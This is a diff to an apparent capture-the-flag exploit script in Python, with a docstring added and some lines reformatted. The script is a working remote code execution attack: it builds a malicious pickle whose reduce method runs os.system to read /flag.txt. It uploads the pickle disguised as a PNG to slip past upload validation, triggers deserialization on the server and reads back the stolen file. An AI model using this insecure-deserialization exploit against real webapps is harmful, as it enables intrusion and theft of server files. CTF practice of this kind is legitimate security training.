@@ -1,3 +1,9 @@
+"""
+Summary: Achieved Remote Code Execution via exploiting a target's note-posting
+webapp by uploading an infected Pickle file posing as a PNG image, the content
+of which is executed by the target upon de-serialization.
+"""
+
 import os
 import pickle
 import random
@@ -29,9 +35,7 @@ FLAG_REGEX = r"flag{.*"
 
 session = requests.Session()
 session.cookies.set(
-    name=os.environ.get("COOKIE_NAME"),
-    value=os.environ.get("COOKIE_VALUE"),
-    domain=DOMAIN,
+    name=os.environ.get("COOKIE_NAME"), value=os.environ.get("COOKIE_VALUE"), domain=DOMAIN,
 )
 
 
@@ -44,17 +48,13 @@ class PickleRCE(object):
         )
         cmd_cat = (
             """python3 -c 'import subprocess,os,sys,pickle;from app import Note;note = Note(title="%s",content=subprocess.getoutput("cat /flag.txt"),image_filename="%s");file = open("./notes/%s.pickle", "wb+");file.write(pickle.dumps(note));file.close()'"""
-            % (
-                MALICIOUS_NOTE_TITLE,
-                INNOCENT_IMAGE_PATH[2:],
-                MALICIOUS_NOTE_TITLE,
-            )
+            % (MALICIOUS_NOTE_TITLE, INNOCENT_IMAGE_PATH[2:], MALICIOUS_NOTE_TITLE,)
         )
 
         return (os.system, (cmd_cat,))
 
 
-# 1. Create RCE pickle — Saved with .png extension to bypass POST validation at server.
+# 1. Create RCE pickle, saved with `.png` extension to bypass POST validation at server
 with open(INFECTED_PICKLE_PATH, "wb") as file:
     file.write(pickle.dumps(PickleRCE()))
 
@@ -66,10 +66,7 @@ trojan_image = (
 # 2. Post infected note
 session.post(
     url=TARGET + "/new",
-    data={
-        "title": INFECTED_NOTE_TITLE,
-        "content": 'Just an "innocent" note',
-    },
+    data={"title": INFECTED_NOTE_TITLE, "content": 'Just an "innocent" note',},
     files={"image": trojan_image},
 )
 
@@ -77,7 +74,7 @@ session.post(
 infected_note_url = TARGET + f"/notes/{INFECTED_NOTE_TITLE}.png?view=True"
 session.get(url=infected_note_url)
 
-# 4. Find flag in ☠️ malicious note created by injected command
+# 4. Find flag in malicious note created by injected command
 malicious_note_url = TARGET + f"/notes/{MALICIOUS_NOTE_TITLE}.pickle?view=True"
 malicious_note = session.get(url=malicious_note_url)
 
